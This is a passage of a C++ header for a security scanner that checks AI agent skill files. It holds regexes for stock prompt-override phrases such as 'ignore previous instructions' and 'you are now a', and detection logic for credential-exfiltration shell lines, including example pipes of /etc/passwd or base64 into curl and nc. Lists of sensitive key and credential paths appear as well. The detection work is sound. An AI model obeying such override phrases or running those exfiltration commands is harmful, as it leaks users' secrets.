// Lineage: informed by ideas from NVIDIA SkillSpector (Apache-2.0), related work; no code or pattern text taken; see docs/LINEAGE.md.
#pragma once
#include "infra/emit.h" // rw::emitTo / emitRaw / formatTo — THE emitter and its siblings
#include <string_view>       // %.*s (precision, pointer) collapses to one view


// skillscan.h — P1-C automatic skill security scanning.
// Scans markdown skill files LINE BY LINE for four vulnerability categories:
//
//   INJECTION   — case-insensitive, word-boundary-anchored prompt-injection phrases (CRITICAL;
//                 single generic words downgrade to WARN)
//   EXFILTRATE  — shell snippets that exfiltrate env vars or credentials (CRITICAL; net-exfil is WARN with
//                 why="no-cred-source" unless a credential-shaped source is on the line; CRITICAL why="sensitive-read-upload"
//                 when a sensitive read feeds an upload; silent with no destination — #353, gradeNetExfil)
//   SCOPE-CREEP — body requests tools absent from the allowed-tools: frontmatter (WARN)
//   FRONTMATTER — YAML keys attempting to set model/system/temperature (WARN)
//
// No tree-sitter parse here: tree_sitter_markdown is vendored (the index reads .md with it), but this scanner does not
// call it. It reads a file line by line with its own fence tracker (``` / ~~~ open and close, and whether the opening
// tag marks an EXAMPLE fence), PLUS a second pass inside `scanSkillText` over a whitespace-normalized join of the body
// (INJECTION only) to catch a phrase split across a newline. A bundled SHELL script (SkillFileKind) is also read as
// whole-file code, every line command context, and merged with that reading; code in other languages is read as
// before and disclosed as code_not_flow_scanned.
// Pattern matching: guarded regexes (src/regexguard.h — ECMAScript, icase where relevant); INJECTION patterns
// are word-boundary-anchored phrases, not bare substrings (a bare substring like "disregard"
// false-positives on "disregarding", and "new persona" on "new personal"). A skill file is UNTRUSTED input, so a
// match the engine abandons can neither terminate the process (wrap.h's scan is noexcept) nor pass as "no match":
// the line gets a CRITICAL SCAN-INCOMPLETE:regex-abandoned finding, failing closed. EXFILTRATE:net-exfil is decided
// by hasNetExfilShape, a linear scan, because its regex was quadratic in the line (see there).
// Findings sorted by (line, rule) for determinism, then deduped on (line, rule) — the per-line and
// joined-body passes can both find the same phrase (byte-identical output across runs).
//
// Style: Allman braces; spaces inside parens; ASSUME/DISCLOSE; ~160–200 col wrap.

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <initializer_list>
#include <iterator>
#include <sstream>
#include <string>
#include <string_view>
#include <tuple>
#include <utility>
#include <vector>

#include "infra/Diagnostics.h"
#include "regexguard.h"        // every pattern here is compiled and matched through the one regex boundary
#include "infra/sortutil.h"    // rw::sortutil::svLess — string_view order without libstdc++ _S_compare wrap
#include "infra/namesplit.h"   // isIdentChar / isIdentStart — the ONE ASCII identifier byte class, which is \b's word class here
#include "infra/stackthreads.h"   // rw::runOnStackThreads — the scan runs on a thread whose stack its subject bound is computed for

namespace rw
{

// ── severity + finding ────────────────────────────────────────────────────────────────────────────

enum class SkillSeverity : std::uint8_t { Info = 0, Warn = 1, Critical = 2 };

struct SkillFinding
{
    SkillSeverity sev;
    int           line;       // 1-based line number in the scanned file
    const char*   rule;       // stable rule name — points into the static pattern table
    std::string   excerpt;    // the offending line, trimmed to ≤120 chars
    const char*   why = nullptr;   // why a rule graded below its usual severity (the row's why=); null = not downgraded
    std::string   dest = {};       // #353 flow: the hosts a net-exfil line was proved to send to (the row's dest=); empty = unproved
    std::string_view owner = {};   // #353 flow: the service a credential variable on that line names and that owns every host (owner=)
};

inline const char* skillSeverityStr( SkillSeverity s ) noexcept
{
    switch( s )
    {
        case SkillSeverity::Critical: return "CRITICAL";
        case SkillSeverity::Warn:     return "WARN    ";
        case SkillSeverity::Info:     return "INFO    ";
    }
    return "INFO    ";
}

// ── declarative pattern table ─────────────────────────────────────────────────────────────────────

namespace detail
{

// Trim trailing whitespace (for excerpt display).
inline std::string_view trimRight( std::string_view s ) noexcept
{
    while( !s.empty() && std::isspace( static_cast<unsigned char>( s.back() ) ) )
    {
        s.remove_suffix( 1 );
    }
    return s;
}

// A finding's excerpt cap: at most kSkillExcerptMaxBytes bytes in all, "..." included.
inline constexpr std::size_t kSkillExcerptMaxBytes = 120;

// The trimmed, clipped excerpt of one skill line. The text is UNTRUSTED and arbitrary UTF-8, so the cut never lands inside a
// multibyte character: it backs off to the code-point boundary, the same rule as serialize.h's truncateUtf8WithEllipsis
// (that header is not reachable from here), and the ASCII "..." is added only when bytes were really dropped — a line of
// exactly the cap is kept whole.
inline std::string clipSkillExcerpt( std::string_view lineText )
{
    std::string excerpt( trimRight( lineText ) );
    if( excerpt.size() <= kSkillExcerptMaxBytes )
    {
        return excerpt;
    }
    std::size_t cut = kSkillExcerptMaxBytes - 3;   // room for the "..."
    while( cut > 0 && ( static_cast<unsigned char>( excerpt[cut] ) & 0xC0 ) == 0x80 )
    {
        --cut;
    }
    excerpt.resize( cut );
    excerpt += "...";
    ENSURES( excerpt.size() <= kSkillExcerptMaxBytes, "the clipped excerpt fits the cap, ellipsis included" );
    return excerpt;
}

// ── INJECTION phrase table (CRITICAL, with a generic-word WARN fallback) ────────────────────────
//
// A4-F12 fix: bare substrings ("disregard", "you are now", "new persona") false-positive on
// ordinary prose — "disregarding trailing whitespace", "Once you are now confident, run the
// tests", "the new personal access token" (⊃ "new persona" as a raw substring). Two changes:
//   1. Every phrase is word-boundary-anchored (\b...\b) so "disregard" no longer matches inside
//      "disregarding", and "new persona" no longer matches inside "new personal".
//   2. The genuinely ambiguous multi-word phrases are additionally ANCHORED to a continuation
//      that only shows up in a real imperative ("you are now A/AN/THE ...", "disregard
//      (all/the) previous/above ..."); a lone "disregard" that doesn't fit that shape downgrades
//      to WARN instead of CRITICAL (still worth a human glance, not a `wrap` blocker).
// Compiled once per `scanSkillText` call via `buildInjectionPatterns()` — std::regex is not
// trivially copyable so these can't be a `constexpr` array like the old literal table.
struct InjectionPattern
{
    const char*   regexSrc;   // ECMAScript regex source (compiled case-insensitive)
    const char*   rule;       // stable rule name emitted in findings
    SkillSeverity sev;        // CRITICAL for an anchored imperative, WARN for a bare generic word
    RegexCompile  re;         // a refusal (never expected for a constant) reads as undecided on every line: loud, fail-closed
};

// Keep entries in stable order (deterministic table iteration → deterministic findings order
// when a line matches multiple patterns — we break after the first match per line). Anchored
// (CRITICAL) forms are listed before their generic (WARN) fallback so the anchored form wins
// when both would match.
inline std::vector<InjectionPattern> buildInjectionPatterns()
{
    std::vector<InjectionPattern> v;
    const auto add = [ & ]( const char* src, const char* rule, SkillSeverity sev )
    {
        v.push_back( { src, rule, sev, compileGuardedRegex( src, kRegexEcmaScript | kRegexIcase ) } );
    };

    add( R"(\bignore\s+(all\s+|the\s+)?previous\s+instructions\b)", "INJECTION:ignore-prev",     SkillSeverity::Critical );
    add( R"(\bdisregard\s+(all\s+|the\s+)?(previous|above)\b)",     "INJECTION:disregard",       SkillSeverity::Critical );
    add( R"(\byou\s+are\s+now\s+(a|an|the)\b)",                     "INJECTION:you-are-now",     SkillSeverity::Critical );
    add( R"(\boverride\s+system\b)",                                "INJECTION:override-system", SkillSeverity::Critical );
    add( R"(\bnew\s+persona\b)",                                    "INJECTION:new-persona",     SkillSeverity::Critical );
    add( R"(\bforget\s+everything\s+above\b)",                      "INJECTION:forget-above",    SkillSeverity::Critical );
    add( R"(\bdisregard\b)",                                        "INJECTION:disregard-generic", SkillSeverity::Warn );

    return v;
}

// ── EXFILTRATE shell-snippet patterns (CRITICAL) ──────────────────────────────────────────────────
//
// We use std::regex (ECMAScript) for these — they involve combinations of tokens across a
// single line that are more naturally expressed as a regex. The regex is compiled once per
// call to `scanSkillText`; the construction is in `buildExfilPatterns()`.
//
// Rules:
//   EXFIL-APIKEY : line contains $ANTHROPIC_API_KEY
//   EXFIL-SSH    : line contains $HOME/.ssh or ~/.ssh or ~/.aws
//   EXFIL-NETEXFIL : line contains (curl|wget|nc) AND ($env-var OR base64), in EITHER order,
//                    fenced-code lines only (prose mentions are not flagged), AND a network command that names a
//                    destination; CRITICAL only with a credential-shaped source on the line, else WARN
//                    why="no-cred-source". Also fires, CRITICAL why="sensitive-read-upload", on a sensitive read fed
//                    to an upload with no var or base64 at all (#353, gradeNetExfil)
//
// "base64 + send" pattern — a line that contains base64 AND (curl|wget|nc), in either order
// (`… | base64 | nc host port` included) — is covered by EXFIL-NETEXFIL.
struct ExfilPattern
{
    const char*  rule;
    RegexCompile re;                    // empty (and unused) when isNetExfilShape decides the rule instead
    bool         isNetExfilShape;       // true ⇒ hasNetExfilShape's linear decision replaces the regex
    bool         requiresCmdContext;  // true ⇒ fires only in a fence OR alongside a transmit verb elsewhere on
                                      // the line (see hasTransmitVerb) — a bare prose mention is documentation.
    bool         fenceOnly;           // true ⇒ fires only inside a fenced code block (see net-exfil below).
    // a compiled regex is NOT trivially copyable → we build these at runtime once.
};

// EXFILTRATE:net-exfil in ONE pass over the line, replacing the regex
//
//     (\b(curl|wget|nc)\b.*(\$[A-Za-z_][A-Za-z0-9_]*|base64))|((\$[A-Za-z_][A-Za-z0-9_]*|base64).*\b(curl|wget|nc)\b)
//
// WHY. The `.*` between two alternations made that regex QUADRATIC in the line on both standard libraries: a fenced
// line of "curl curl curl …" with no variable after it backtracks the whole remainder from every "curl". Measured on
// the release binary: 20,000 bytes took 5.9 s and 200,000 bytes was still running at 60 s — a skill file is exactly
// the untrusted input a scanner must not hang on. (On libstdc++ a long enough `.*` also overflows the stack.)
//
// EQUIVALENCE, derived from the regex rather than approximated, and gated differentially against it
// (test/regexguardcheck.sh arm (f)): `.` matches any byte but '\n' and '\r' (the terminators both engines exclude
// for char), so both tokens must sit in one '\r'-free segment. A TOOL is a maximal word run ([A-Za-z0-9_]+, the
// \b rule in the "C" locale) equal to curl, wget or nc. A VAR is '$' followed by [A-Za-z_] — the regex's trailing
// [A-Za-z0-9_]* can always backtrack to empty, so that is its shortest form — or the substring "base64", which needs
// no boundary. The first alternative holds iff some tool ENDS at or before some var STARTS; the second iff some var's
// shortest END is at or before some tool STARTS. So one pass keeps four numbers per segment.
// What one '\r'-free segment holds, in the four positions the decision needs. A segment is bounded by '\r' or the line
// ends, both non-word, so a word run inside it is maximal in the line too and the \b rule can be read locally.
struct NetExfilPositions
{
    std::size_t earliestToolEnd = std::string_view::npos, latestToolStart = 0;
    std::size_t earliestVarEnd  = std::string_view::npos, latestVarStart  = 0;
    bool        hasTool = false, hasVar = false;

    void noteTool( std::size_t start, std::size_t end ) noexcept
    {
        hasTool         = true;
        earliestToolEnd = std::min( earliestToolEnd, end );
        latestToolStart = std::max( latestToolStart, start );
    }
    void noteVar( std::size_t start, std::size_t shortestEnd ) noexcept
    {
        hasVar         = true;
        latestVarStart = std::max( latestVarStart, start );
        earliestVarEnd = std::min( earliestVarEnd, shortestEnd );
    }
    bool isExfil() const noexcept
    {
        return hasTool && hasVar && ( earliestToolEnd <= latestVarStart || earliestVarEnd <= latestToolStart );
    }
};

inline NetExfilPositions netExfilPositions( std::string_view segment ) noexcept
{
    NetExfilPositions positions;
    for( std::size_t i = 0; i < segment.size(); )
    {
        if( !namesplit::isIdentChar( segment[i] ) )
        {
            if( segment[i] == '$' && i + 1 < segment.size() && namesplit::isIdentStart( segment[ i + 1 ] ) )
            {
                positions.noteVar( i, i + 2 );
            }
            ++i;
            continue;
        }
        std::size_t runEnd = i;
        while( runEnd < segment.size() && namesplit::isIdentChar( segment[runEnd] ) )
        {
            ++runEnd;
        }
        const std::string_view word = segment.substr( i, runEnd - i );
        if( word == "curl" || word == "wget" || word == "nc" )
        {
            positions.noteTool( i, runEnd );
        }
        for( std::size_t at = word.find( "base64" ); at != std::string_view::npos; at = word.find( "base64", at + 1 ) )
        {
            positions.noteVar( i + at, i + at + 6 );
        }
        i = runEnd;
    }
    return positions;
}

inline bool hasNetExfilShape( std::string_view line ) noexcept
{
    for( std::size_t segBegin = 0;; )
    {
        // `.` excludes both terminators, so a segment ends at either. scanSkillText hands over one line with no '\n',
        // but splitting on it too keeps this function equal to the regex on ANY input, not only on the one caller's.
        const std::size_t cr     = line.find_first_of( "\r\n", segBegin );
        const std::size_t segEnd = ( cr == std::string_view::npos ) ? line.size() : cr;
        if( netExfilPositions( line.substr( segBegin, segEnd - segBegin ) ).isExfil() )
        {
            return true;
        }
        if( segEnd == line.size() )
        {
            return false;
        }
        segBegin = segEnd + 1;
    }
}

// ── #353: what grades a net-exfil hit CRITICAL ───────────────────────────────────────────────────────────────────────
// hasNetExfilShape says a network verb shares a line with SOME `$VAR` or base64. That shape is equally true of
// `curl https://api.airtable.com/v0/$BASE_ID` and of a token on its way out, so on its own it is a WARN. The hit is
// CRITICAL only when a CREDENTIAL-SHAPED source sits on the same line (gradeNetExfil). This is the quick
// severity fix: it grades the lines the rule already matches (netFlow below adds the two follow-up rules). Following a source to its sink
// across lines, and resolving where `$VAR` points, is the flow decision still to come.
inline constexpr const char* kNetExfilNoCredWhy = "no-cred-source";

// Lowercase needles for isCredentialName and isKeyFileToken: WORDS match anywhere in a name, PARTS only as a whole
// `_ - .`-separated component, SHAPES anywhere in a non-URL token.
inline constexpr std::string_view kCredentialWords[] = { "token", "secret", "passw", "credential", "apikey" };
inline constexpr std::string_view kCredentialParts[] = { "key", "keys", "auth", "pat", "pass", "pw" };
inline constexpr std::string_view kKeyFileShapes[]   = { ".ssh/", ".pem", ".netrc", ".aws/credentials", "/environ", "id_rsa", "id_ecdsa", "id_ed25519" };

// A LOWERCASED name that reads as a credential: an env/var name (`github_token`, `aws_secret_access_key`,
// `db_password`) or a file's base name (`secret`, `token.json`). Short words count only as a whole component between
// `_ - .` separators, so `$AUTHOR`, `$MONKEY` and `$PWD` (the shell's working directory) are not credentials.
inline bool isCredentialName( std::string_view lowered ) noexcept
{
    const auto has = [ & ]( std::string_view word ) noexcept { return lowered.find( word ) != std::string_view::npos; };
    if( std::any_of( std::begin( kCredentialWords ), std::end( kCredentialWords ), has ) || ( lowered.size() > 4 && lowered.starts_with( "aws_" ) ) )
    {
        return true;
    }
    for( std::size_t begin = 0; begin < lowered.size(); )
    {
        const std::size_t end  = std::min( lowered.find_first_of( "_-.", begin ), lowered.size() );
        const std::string_view part = lowered.substr( begin, end - begin );
        if( std::find( std::begin( kCredentialParts ), std::end( kCredentialParts ), part ) != std::end( kCredentialParts ) )
        {
            return true;
        }
        begin = end + 1;
    }
    return false;
}

// A LOWERCASED token that names a key file or the process environment, wherever it sits (a URL is not a file read).
inline bool isKeyFileToken( std::string_view lowered ) noexcept
{
    return lowered.find( "://" ) == std::string_view::npos
        && std::any_of( std::begin( kKeyFileShapes ), std::end( kKeyFileShapes ), [ & ]( std::string_view shape ) noexcept { return lowered.find( shape ) != std::string_view::npos; } );
}

// The operand a token hands to a sender or a redirect, or empty: curl's `@file` (also `--data-binary=@file`, `f=@file`),
// wget's `--post-file=file`, dd's `if=file`, and the token after `-T`/`--upload-file`, openssl's `-in`, or a `<` redirect.
// A READER's arguments (cat, base64, …) are netFlow's to judge: every non-flag argument of one is a read. `token` is
// lowercased; `prevToken` keeps its case (`-T` uploads a file; `-t` is a telnet option).
inline std::string_view fileOperand( std::string_view token, std::string_view prevToken, bool afterRedirect ) noexcept
{
    if( afterRedirect || prevToken == "-T" || prevToken == "--upload-file" || prevToken == "-in" )
    {
        return token;
    }
    for( const std::string_view prefix : { std::string_view( "--post-file=" ), std::string_view( "if=" ), std::string_view( "@" ) } )
    {
        if( token.starts_with( prefix ) )
        {
            return token.substr( prefix.size() );
        }
    }
    const std::size_t eqAt = token.find( "=@" );
    return eqAt == std::string_view::npos ? std::string_view{} : token.substr( eqAt + 2 );
}

// A `$NAME` or `${NAME` on the LOWERCASED line whose name isCredentialName, or an `authorization:` header with a `$`
// after it (a var or a command substitution).
inline bool hasCredentialVar( std::string_view lowered ) noexcept
{
    for( std::size_t dollar = lowered.find( '$' ); dollar != std::string_view::npos; dollar = lowered.find( '$', dollar + 1 ) )
    {
        const std::size_t nameBegin = dollar + ( ( dollar + 1 < lowered.size() && lowered[ dollar + 1 ] == '{' ) ? 2 : 1 );
        std::size_t       nameEnd   = nameBegin;
        while( nameEnd < lowered.size() && namesplit::isIdentChar( lowered[nameEnd] ) )
        {
            ++nameEnd;
        }
        if( nameEnd > nameBegin && isCredentialName( lowered.substr( nameBegin, nameEnd - nameBegin ) ) )
        {
            return true;
        }
    }
    const std::size_t header = lowered.find( "authorization:" );
    return header != std::string_view::npos && lowered.find( '$', header ) != std::string_view::npos;
}

// A shell word on the LOWERCASED line that is a credential source by itself: `printenv`, a bare `env` (a whole-environment
// dump — but `env LANG=C cmd`, env followed by an assignment, is the prefix idiom that runs cmd, not a dump), or a key file
// (isKeyFileToken). A credential-NAMED file that is read (`cat secret`) is netFlow's credentialRead.
inline bool hasCredentialToken( std::string_view lowered ) noexcept
{
    constexpr std::string_view kSeparators = " \t\"'`|;&()<>";
    bool envPending = false;   // `env` seen: the next word decides whether it dumps or prefixes
    for( std::size_t i = 0; i < lowered.size(); )
    {
        if( kSeparators.find( lowered[i] ) != std::string_view::npos )
        {
            ++i;
            continue;
        }
        const std::size_t      end   = std::min( lowered.find_first_of( kSeparators, i ), lowered.size() );
        const std::string_view token = lowered.substr( i, end - i );
        if( envPending && ( token.starts_with( '-' ) || token.find( '=' ) == std::string_view::npos ) )
        {
            return true;
        }
        envPending = token == "env";
        if( token == "printenv" || isKeyFileToken( token ) )
        {
            return true;
        }
        i = end;
    }
    return envPending;
}


// ── #353 follow-up: where a network command sends, and whether a sensitive read feeds it ─────────────────────────────
// Two rules the reporter's corrected histogram asked for, both decided by netFlow in ONE pass over the line:
//   R1  a network verb with NO destination is not a flow. `command -v curl`, `which curl` and `for t in jq curl git`
//       name the tool without running it, so net-exfil does not fire on them at all.
//   R2  a SENSITIVE read piped, redirected or passed into a network command is exfiltration with no variable in sight:
//       `cat /etc/passwd | curl … --data-binary @-` scanned clean. It is CRITICAL, why="sensitive-read-upload", whether
//       or not the destination could be read — a sensitive read reaching a network verb is exfiltration wherever it goes.
// THE INVARIANT (gradeNetExfil): R1 and R2 only ever silence or downgrade a line that carries NO credential token and NO
// sensitive read. A line main graded CRITICAL that carries either stays CRITICAL — pinned by test/skillscan.sh check 18's
// block-2 (credential) and block-3 (sensitive-read) fixture rows.
// Still line-local: a read on one line and an upload on the next is the flow fix still to come.
inline constexpr const char* kNetExfilSensitiveWhy = "sensitive-read-upload";

inline constexpr std::string_view kNetVerbs[]            = { "curl", "wget", "nc", "ncat", "netcat", "socat" };
// The netcat family names its destination positionally: `nc [flags] HOST PORT`. A bare word followed by a number is that
// pair; `nc -l 4444` (a number after a flag) listens and names none.
inline constexpr std::string_view kNetcatVerbs[]         = { "nc", "ncat", "netcat" };
// socat addresses that connect somewhere, and those that read a file (`FILE:/etc/shadow`).
inline constexpr std::string_view kSocketAddressPrefixes[] = { "tcp:", "tcp4:", "tcp6:", "udp:", "udp4:", "udp6:", "openssl:", "ssl:",
                                                               "tcp-connect:", "openssl-connect:" };
inline constexpr std::string_view kSocatFilePrefixes[]   = { "file:", "open:", "gopen:" };
// Commands whose every non-flag argument is a file they READ to stdout (or into an archive or encoding on stdout).
inline constexpr std::string_view kReaders[]             = { "cat", "base64", "xxd", "od", "head", "tail", "gzip", "bzip2", "xz",
                                                             "tar", "cp", "dd", "openssl" };
// Words that leave the next one in command position — `sudo curl`, `do curl`, `stdbuf -oL curl` — with the options of
// theirs that take the NEXT word as a value (`sudo -u deploy curl`, `stdbuf -o L curl`), matched case-sensitively.
// `command` is a prefix only when not followed by -v/-V: `command -v curl` names the tool and runs nothing.
struct CommandPrefix
{
    std::string_view word;
    std::string_view valueOptions;   // space-separated
};
inline constexpr CommandPrefix kCommandPrefixes[] = {
    { "sudo", "-u -g -C -D -h -p -r -t -U -T" }, { "doas", "-u -C" }, { "run0", "-u -g -D" }, { "exec", "-a" }, { "time", "-f -o" },
    { "nohup", "" }, { "nice", "-n" }, { "timeout", "-s -k" }, { "xargs", "-I -n -P -L -s -d -E -a" }, { "env", "-u -C" },
    { "stdbuf", "-o -e -i" }, { "setsid", "" }, { "eval", "" }, { "builtin", "" }, { "command", "" },
    { "then", "" }, { "do", "" }, { "else", "" }, { "if", "" }, { "elif", "" }, { "while", "" }, { "until", "" }, { "!", "" } };
inline constexpr std::string_view kSensitiveShapes[]     = { "/etc/passwd", "/etc/shadow", ".ssh/", ".netrc", ".aws/credentials", "/environ",
                                                             "keychain", ".git-credentials" };
inline constexpr std::string_view kSensitiveBaseStarts[] = { "id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "cookies", ".env." };
inline constexpr std::string_view kKeychainDumps[]       = { "dump-keychain", "find-generic-password", "find-internet-password" };

// A LOWERCASED file operand whose content is a secret: account databases, private keys (a `.pub` key is meant to be
// shared), .netrc, cloud and git credential stores, a process environment, a keychain, a browser cookie store, `.env`.
inline bool isSensitivePath( std::string_view lowered ) noexcept
{
    if( lowered.find( "://" ) != std::string_view::npos )
    {
        return false;
    }
    const std::size_t      slash = lowered.find_last_of( '/' );
    const std::string_view base  = slash == std::string_view::npos ? lowered : lowered.substr( slash + 1 );
    if( base.ends_with( ".pub" ) )
    {
        return false;
    }
    return base == ".env" || base == ".ssh" || base.ends_with( ".pem" ) || base.ends_with( ".key" )
        || std::any_of( std::begin( kSensitiveShapes ), std::end( kSensitiveShapes ), [ & ]( std::string_view s ) noexcept { return lowered.find( s ) != std::string_view::npos; } )
        || std::any_of( std::begin( kSensitiveBaseStarts ), std::end( kSensitiveBaseStarts ), [ & ]( std::string_view s ) noexcept { return base.starts_with( s ); } );
}

// A LOWERCASED argument of a network command that names where it sends: a URL, a socat socket address (`TCP:h:p`), a
// `$VAR` (a host held in a variable), an IPv6 literal, localhost, user@host, or a dotted host. Flags, `@file` data and
// paths are not destinations. netFlow adds the ones that need context: an `nc HOST PORT` pair, a `/dev/tcp/` redirect,
// and any bare word after curl or wget (a single-label host such as `evilhost`).
inline bool isDestinationToken( std::string_view lowered ) noexcept
{
    if( lowered.empty() )
    {
        return false;
    }
    if( lowered.find( "://" ) != std::string_view::npos
        || std::any_of( std::begin( kSocketAddressPrefixes ), std::end( kSocketAddressPrefixes ), [ & ]( std::string_view p ) noexcept { return lowered.starts_with( p ); } ) )
    {
        return true;
    }
    const char c = lowered[0];
    if( c == '$' )
    {
        return lowered.size() > 1 && ( lowered[1] == '{' || namesplit::isIdentStart( lowered[1] ) );
    }
    if( c == '[' )
    {
        return true;
    }
    if( !namesplit::isIdentChar( c ) )
    {
        return false;
    }
    if( lowered == "localhost" || lowered.starts_with( "localhost:" ) || lowered.find( '@' ) != std::string_view::npos )
    {
        return true;
    }
    return lowered.find( '.' ) != std::string_view::npos && lowered.back() != '.';
}

inline bool isAllDigits( std::string_view s ) noexcept
{
    return std::all_of( s.begin(), s.end(), []( char ch ) noexcept { return ch >= '0' && ch <= '9'; } );
}


struct NetFlow
{
    bool hasDestination  = false;   // R1: some segment runs a network command that names a destination
    bool sensitiveUpload = false;   // R2: a network segment reads, or is piped, a sensitive file
    bool sensitiveRead   = false;   // some segment reads a sensitive file, fed to the network or not
    bool credentialRead  = false;   // some segment reads a file NAMED like a credential (`cat secret`)
};

// The operand a token reads, for netFlow: fileOperand's, or the path of a socat file address (`FILE:/etc/shadow,ignoreeof`
// reads /etc/shadow — the path runs to the first comma).
inline std::string_view flowReadOperand( std::string_view low, std::string_view prevToken, bool redirectIn ) noexcept
{
    const std::string_view operand = fileOperand( low, prevToken, redirectIn );
    if( !operand.empty() )
    {
        return operand;
    }
    for( const std::string_view prefix : kSocatFilePrefixes )
    {
        if( low.starts_with( prefix ) )
        {
            const std::string_view path = low.substr( prefix.size() );
            return path.substr( 0, path.find( ',' ) );
        }
    }
    return {};
}

// The scan state where a shell word's FIRST piece starts: what the whole word is read against once it ends.
struct WordStart
{
    std::string_view prev;              // the token before the word
    bool             redirectIn;        // the word follows `<`
    bool             commandPosition;   // the word is the segment's command (or a runner prefix)
    bool             skipValue;         // the word is a runner option's value (`sudo -u ro''ot cat`)
    const CommandPrefix* activePrefix;  // the runner whose options the word may be (`sudo "-"u root cat`)
};

// netFlow's state, one pipeline segment at a time. Split out so each step reads alone: punctuation() consumes the
// separators and redirects, word() classifies one shell word (prefixWord() while the segment's command is still to come),
// endSegment() settles a segment.
struct NetFlowScan
{
    NetFlow              flow;
    bool                 expectCommand = true, segNet = false, segDest = false, segSensitive = false, stdinSensitive = false;
    bool                 redirectIn = false, redirectOut = false, segNetcat = false, segCurlWget = false, segReader = false;
    bool                 prevBareWord = false, skipValue = false, cmdReader = false, inBacktick = false;
    std::vector<char>    outerReader;   // cmdReader of each open `(` / `<(` / `$(` / backtick context, restored when it closes
    const CommandPrefix* activePrefix = nullptr;
    std::string_view     prevToken;

    void endSegment( bool piped ) noexcept
    {
        if( segNet )
        {
            flow.hasDestination  = flow.hasDestination || segDest;
            flow.sensitiveUpload = flow.sensitiveUpload || segSensitive || stdinSensitive;
        }
        flow.sensitiveRead = flow.sensitiveRead || segSensitive;
        stdinSensitive     = piped && ( stdinSensitive || segSensitive );
        segNet = segDest = segSensitive = redirectIn = redirectOut = segNetcat = segCurlWget = segReader = prevBareWord = skipValue = false;
        activePrefix  = nullptr;
        expectCommand = true;
        cmdReader     = false;
        prevToken     = {};
    }

    // A nested command context opens (`<(`, `$(`, `(`, an opening backtick) or closes (`)`, the closing backtick). The
    // current command's reader state belongs to its own context: `cat <(sh -c '…')` must not read sh's quoted script as
    // cat's file, and `cat <(…) "/etc/passwd"` must read it again once the context closes.
    void nest( bool open ) noexcept
    {
        if( open )
        {
            outerReader.push_back( cmdReader ? 1 : 0 );
            cmdReader = false;
            return;
        }
        if( !outerReader.empty() )
        {
            cmdReader = outerReader.back() != 0;
            outerReader.pop_back();
        }
    }

    // Bytes of punctuation consumed at line[i], or 0 when a shell word starts there.
    std::size_t punctuation( std::string_view line, std::size_t i ) noexcept
    {
        constexpr std::string_view kOtherSeparators = " \t\"')";
        const char c    = line[i];
        const char next = i + 1 < line.size() ? line[ i + 1 ] : '\0';
        if( c == '|' )
        {
            endSegment( next != '|' );
            return next == '|' ? 2 : 1;
        }
        if( c == ';' || c == '\r' || c == '\n' || ( c == '&' && next != '>' ) )
        {
            endSegment( false );
            return ( c == '&' && next == '&' ) ? 2 : 1;
        }
        if( ( c == '<' || c == '>' ) && next == '(' )
        {   // `<( … )` / `>( … )` process substitution: a NESTED command, not a redirect — open a command context
            nest( true );
            expectCommand = true;
            activePrefix  = nullptr;
            skipValue     = false;
            return 2;
        }
        if( c == '>' || c == '&' )   // `>`, `>>`, `>&2`, `&>`: an output target follows — neither a read nor a destination
        {
            redirectOut = true;
            return ( next == '&' || next == '>' ) ? 2 : 1;
        }
        // A spaced opening quote may open a nested command (`sh -c "curl …"`, `echo "cat … | curl …" | sh`, `ssh host "…"`)
        // EXCEPT in a reader's segment, where it quotes the file the reader reads: re-arming there read
        // `cat "/etc/passwd" | curl … @-` as a command named /etc/passwd, so the read was never noted and R2 stayed silent,
        // and `head -c "4096" /etc/passwd` made the count a prefix and the file the command.
        if( c == '(' || c == ')' || c == '`' )
        {
            const bool open = c == '(' || ( c == '`' && !inBacktick );
            inBacktick      = c == '`' ? !inBacktick : inBacktick;
            nest( open );
        }
        const bool runsQuote = ( c == '"' || c == '\'' ) && ( i == 0 || line[ i - 1 ] == ' ' || line[ i - 1 ] == '\t' ) && !cmdReader;
        const bool rearm = c == '(' || c == '`' || runsQuote;
        if( rearm && !expectCommand )   // a new command may start inside `$(`, a backtick or an opening quote
        {
            expectCommand = true;
            activePrefix  = nullptr;
            skipValue     = false;
        }
        redirectIn = redirectIn || c == '<';
        return ( c == '<' || c == '(' || c == '`' || kOtherSeparators.find( c ) != std::string_view::npos ) ? 1 : 0;
    }

    // In command position: is this word still the prefix — a runner word, one of its options, an option's value, an
    // assignment, a number? False means it is the command itself.
    bool prefixWord( std::string_view token, std::string_view low ) noexcept
    {
        if( skipValue )
        {
            skipValue = false;
            return true;
        }
        for( const CommandPrefix& prefix : kCommandPrefixes )
        {
            if( low == prefix.word )
            {
                activePrefix = &prefix;
                return true;
            }
        }
        if( low.starts_with( '-' ) )
        {
            if( activePrefix != nullptr && activePrefix->word == "command" && ( token == "-v" || token == "-V" ) )
            {
                expectCommand = false;   // `command -v curl` names the tool; nothing runs
                return true;
            }
            skipValue = activePrefix != nullptr && namesplit::hasField( activePrefix->valueOptions, " ", token, /*visitTrailingEmpty=*/false );
            return true;
        }
        return low.find( '=' ) != std::string_view::npos || isAllDigits( low );
    }

    // The segment's command: a network verb opens a network segment (netcat's also arms the HOST PORT pair, curl's and
    // wget's a bare-word host); a reader makes every later non-flag word a read.
    void noteCommand( std::string_view low ) noexcept
    {
        expectCommand = false;
        activePrefix  = nullptr;
        const std::size_t      slash    = low.find_last_of( '/' );
        const std::string_view verb     = slash == std::string_view::npos ? low : low.substr( slash + 1 );
        const auto             in       = [ & ]( const auto& table ) noexcept { return std::find( std::begin( table ), std::end( table ), verb ) != std::end( table ); };
        const bool             isNetcat = in( kNetcatVerbs );
        segNet      = segNet || isNetcat || in( kNetVerbs );
        segNetcat   = segNetcat || isNetcat;
        segCurlWget = segCurlWget || verb == "curl" || verb == "wget";
        cmdReader   = in( kReaders );
        segReader   = segReader || cmdReader;
    }

    // A read operand: note whether it is sensitive, and whether it is named like a credential.
    void noteRead( std::string_view operand ) noexcept
    {
        segSensitive        = segSensitive || isSensitivePath( operand );
        flow.credentialRead = flow.credentialRead || isCredentialName( namesplit::afterLast( operand, "/" ) );
    }

    void word( std::string_view token, std::string_view low ) noexcept
    {
        if( low.find( "/dev/tcp/" ) != std::string_view::npos || low.find( "/dev/udp/" ) != std::string_view::npos )
        {   // bash's raw-socket redirect, `/dev/tcp/HOST/PORT`: a network sink with its destination in the path
            segNet = segDest = true;
        }
        if( redirectOut )
        {
